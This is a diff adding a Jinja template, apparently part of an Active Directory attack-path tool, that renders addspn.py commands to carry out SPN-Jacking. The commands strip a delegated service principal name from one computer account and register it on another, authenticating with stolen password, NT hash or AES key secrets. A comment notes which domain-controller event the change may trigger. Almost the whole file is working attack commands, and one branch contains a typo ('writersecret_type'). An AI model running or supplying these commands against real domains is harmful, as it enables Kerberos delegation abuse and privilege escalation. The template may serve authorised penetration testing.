@@ -1,0 +1,37 @@
+{% set original_target = require['original_target'] %}
+{% set requested_spn = parent.obj.rights_by_sid[original_target.sid]['AllowedToDelegate'][0] %}
+# SPN-Jacking: clear the SPN on {{original_target.name}} and register it on {{target.name}}
+# Reference: https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/
+# Modifying the servicePrincipalName attribute may generate 5136 events on the domain
+# controller if an appropriate SACL is in place on the target object.
+# The targeted SPN is {{requested_spn}}
+
+{% if requested_spn in target.spn %}
+# Live SPN Jacking
+
+{% set writer = original_target.spn_writer -%}
+
+# Clear the SPN on {{original_target.name}}
+{% if writer.krb_auth %}
+./tools/addspn.py '{{fqdn}}/{{writer.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k -t '{{original_target.name}}' -rm {{requested_spn}}
+{%- elif writer.secret_type == T_SECRET_NTHASH %}
+./tools/addspn.py '{{fqdn}}/{{writer.obj.name}}@{{dc_ip}}' -use-ldaps -hashes :{{writer.secret|red}} -t '{{original_target.name}}' -rm {{requested_spn}}
+{%- elif writersecret_type == T_SECRET_AESKEY %}
+./tools/addspn.py '{{fqdn}}/{{writer.obj.name}}@{{dc_ip}}' -use-ldaps -k -aesKey {{writer.secret|red}} -t '{{original_target.name}}' -rm {{requested_spn}}
+{%- elif writer.secret_type == T_SECRET_PASSWORD %}
+./tools/addspn.py '{{fqdn}}/{{writer.obj.name}}:{{writer.secret|red}}@{{dc_ip}}' -use-ldaps -t '{{original_target.name}}' -rm {{requested_spn}}
+{%- endif %}
+{% else %}
+# Ghost SPN Jacking
+{%- endif %}
+
+{% set writer = target.spn_writer %}
+
+# Register the hijacked SPN on {{target.name}}
+{% if writer.secret_type == T_SECRET_NTHASH %}
+./tools/addspn.py '{{fqdn}}/{{writer.obj.name}}@{{dc_ip}}' -use-ldaps -hashes :{{writer.secret|red}} -t '{{target.name}}' -add {{requested_spn}}
+{%- elif writer.secret_type == T_SECRET_AESKEY %}
+./tools/addspn.py '{{fqdn}}/{{writer.obj.name}}@{{dc_ip}}' -use-ldaps -k -aesKey {{writer.secret|red}} -t '{{target.obj.name}}' -add {{requested_spn}}
+{%- elif writer.secret_type == T_SECRET_PASSWORD %}
+./tools/addspn.py '{{fqdn}}/{{writer.obj.name}}:{{writer.secret|red}}@{{dc_ip}}' -use-ldaps -t '{{target.name}}' -add {{requested_spn}}
+{%- endif %}
